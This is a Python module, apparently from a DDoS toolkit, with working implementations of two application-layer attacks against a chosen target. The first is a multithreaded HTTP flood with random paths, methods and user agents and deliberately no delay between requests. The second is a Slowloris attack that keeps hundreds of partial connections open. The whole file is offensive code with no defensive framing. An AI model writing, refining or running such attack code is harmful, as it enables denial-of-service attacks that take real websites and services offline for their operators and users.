"""
Layer 7 (Application) DDoS Attacks
HTTP Flood, Slowloris
"""

import socket
import threading
import time
import random
from .base import AttackBase


class HTTPFlood(AttackBase):
    """
    HTTP Flood Attack - High-volume HTTP requests
    
    IMPROVED VERSION:
    - NO sleep delays (realistic flood)
    - Random paths and methods
    - Random User-Agents
    - Connection reuse where possible
    """
    
    def execute(self, duration: int, threads: int = 100, **kwargs) -> bool:
        """
        Execute HTTP flood attack
        
        Args:
            duration: Attack duration in seconds
            threads: Number of concurrent threads
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting HTTP FLOOD on http://{self.target}:{self.port}')
        self.log('INFO', f'Duration: {duration}s | Threads: {threads}')
        
        def worker():
            """Thread worker - sends HTTP requests continuously"""
            end_time = time.time() + duration
            local_count = 0
            local_errors = 0
            
            methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
            paths = [
                '/', '/index.html', '/api/data', '/admin', '/login',
                '/search', '/api/users', '/dashboard', '/config', '/status'
            ]
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                'Mozilla/5.0 (X11; Linux x86_64)',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            ]
            
            while time.time() < end_time and not self.stop_flag:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    
                    # Build HTTP request
                    method = random.choice(methods)
                    path = random.choice(paths)
                    ua = random.choice(user_agents)
                    
                    request = f"{method} {path} HTTP/1.1\r\n"
                    request += f"Host: {self.target}\r\n"
                    request += f"User-Agent: {ua}\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    sock.sendall(request.encode())
                    
                    # Try to read response (don't wait long)
                    try:
                        sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                    local_count += 1
                    
                    # NO SLEEP - this is the key improvement!
                    # Real attacks don't sleep between requests
                    
                except Exception:
                    local_errors += 1
            
            # Update global stats (thread-safe)
            self.stats['requests_sent'] += local_count
            self.stats['errors'] += local_errors
        
        try:
            self.start()
            
            # Launch attack threads
            attack_threads = []
            for i in range(threads):
                t = threading.Thread(target=worker, daemon=True)
                t.start()
                attack_threads.append(t)
            
            # Wait for duration
            time.sleep(duration)
            self.stop_flag = True
            
            # Wait for threads to finish
            for t in attack_threads:
                t.join(timeout=2)
            
            self.stop()
            
            total_requests = self.stats['requests_sent']
            actual_duration = self.get_duration()
            rps = total_requests / actual_duration if actual_duration > 0 else 0
            
            self.log('SUCCESS', f'✓ HTTP flood completed: {total_requests:,} requests ({rps:.2f} req/s)')
            self.log('INFO', f'Errors: {self.stats["errors"]:,}')
            return True
            
        except Exception as e:
            self.log('ERROR', f'HTTP flood failed: {str(e)}')
            self.stop()
            return False


class Slowloris(AttackBase):
    """
    Slowloris Attack - Keep HTTP connections open with slow headers
    
    This implementation is already near-perfect, keeping it as-is
    """
    
    def execute(self, duration: int, connections: int = 500, **kwargs) -> bool:
        """
        Execute Slowloris attack
        
        Args:
            duration: Attack duration in seconds
            connections: Number of slow connections to maintain
            
        Returns:
            True if successful
        """
        self.log('ATTACK', f'🔴 Starting SLOWLORIS on {self.target}:{self.port}')
        self.log('INFO', f'Duration: {duration}s | Connections: {connections}')
        
        sockets_list = []
        
        def create_slow_socket():
            """Create a slow connection"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                
                # Send partial HTTP request
                request = f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                sock.send(request.encode())
                
                return sock
            except:
                return None
        
        try:
            self.start()
            
            # Create initial connections
            self.log('INFO', f'Creating {connections} slow connections...')
            for _ in range(connections):
                sock = create_slow_socket()
                if sock:
                    sockets_list.append(sock)
            
            self.log('INFO', f'Created {len(sockets_list)} connections. Sending slow headers...')
            
            # Keep connections alive with slow headers
            end_time = time.time() + duration
            while time.time() < end_time and not self.stop_flag:
                # Send partial headers to keep connections alive
                for sock in sockets_list[:]:
                    try:
                        header = f"X-a: {random.randint(1, 5000)}\r\n"
                        sock.send(header.encode())
                        self.stats['requests_sent'] += 1
                    except:
                        sockets_list.remove(sock)
                        # Replace dead connection
                        new_sock = create_slow_socket()
                        if new_sock:
                            sockets_list.append(new_sock)
                
                self.log('DEBUG', f'Active connections: {len(sockets_list)}')
                time.sleep(10)  # Send header every 10 seconds (this sleep is intentional!)
            
            # Close all connections
            for sock in sockets_list:
                try:
                    sock.close()
                except:
                    pass
            
            self.stop()
            self.log('SUCCESS', f'✓ Slowloris completed ({len(sockets_list)} connections maintained)')
            return True
            
        except Exception as e:
            self.log('ERROR', f'Slowloris failed: {str(e)}')
            self.stop()
            return False
